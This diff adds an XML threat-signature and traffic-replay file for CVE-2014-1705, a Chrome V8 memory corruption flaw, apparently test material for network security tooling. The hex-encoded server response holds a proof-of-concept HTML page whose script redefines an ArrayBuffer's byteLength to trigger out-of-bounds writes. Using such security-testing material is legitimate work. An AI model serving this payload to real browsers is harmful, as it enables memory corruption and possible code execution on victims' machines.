@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Google Chrome V8 JavaScript Engine Memory Corruption"/>
+    <EngDesc display="true" value="A memory corruption vulnerability exist in Google Chrome. The vulnerability is due to an error while processing JavaScript code by the V8 JavaScript Engine. A remote attacker could exploit this vulnerability by enticing a user to open a malicious web page. Successful exploitation could permit an attacker to execute arbitrary code in the Google Chrome sandbox"/>
+    <Intent display="true">
+      <item value="MEMORY_CORRUPTION"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS,HTML"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Google"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Chrome"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="for_Linux_and_Mac_prior_to_33.0.1750.152"/>
+      <item value="prior_to_33.0.1750.154"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140317-06"/>
+    <CVEID display="true" value="CVE-2014-1705"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="435a46dd2ddf4a3e1a19baea07332882"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635315319175018128"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1396085429" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="C"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:10:65" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="018F" Identification="5C84" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="3B76" srcIP="172.16.8.76" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49495" destPort="$HTTPdestPort" SeqNumber="71FD9F51" AckNumber="1156CA72" HeaderLength="05" WindowSize="0100" Checksum="A698" UrgentPointer="0000" Options="" Payload="474554202F7E61616B756E65792F4D617231372D6368726F6D652F706F632E68746D6C20485454502F312E310D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C696D6167652F776562702C2A2F2A3B713D302E380D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420362E3129204170706C655765624B69742F3533372E333620284B48544D4C2C206C696B65204765636B6F29204368726F6D652F33332E302E313735302E313439205361666172692F3533372E33360D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174652C736463680D0A4163636570742D4C616E67756167653A20656E2D55532C656E3B713D302E380D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:10:65" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02DF" Identification="4418" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="9292" srcIP="$destIP" destIP="172.16.8.76" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="49495" SeqNumber="1156CA72" AckNumber="71FDA0B8" HeaderLength="05" WindowSize="0036" Checksum="DFF0" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C203139204D617220323031342032303A30353A343920474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E34205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205765642C203139204D617220323031342031393A35303A323920474D540D0A455461673A2022346334383032352D3133622D34663466616636663338623430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203331350D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0D0A3C686561643E0D0A3C7363726970743E0D0A66756E6374696F6E206C656E28290D0A7B0D0A2020202072657475726E20307831303030303030303B0D0A7D0D0A0D0A7661722061203D206E6577204172726179427566666572283136293B0D0A612E5F5F646566696E654765747465725F5F2822627974654C656E677468222C206C656E293B0D0A0D0A7661722062203D206E657720496E74333241727261792861293B0D0A0D0A666F7220287661722069203D20303B2069203C20622E6C656E6774683B20692B2B29200D0A7B0D0A20202020625B695D203D20307834313431343134313B0D0A7D0D0A3C2F7363726970743E0D0A3C2F686561643E0D0A3C626F64793E0D0A3C703E54454C5553205365637572697479204C6162733C2F703E0D0A3C2F626F64793E0D0A3C2F68746D6C3E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
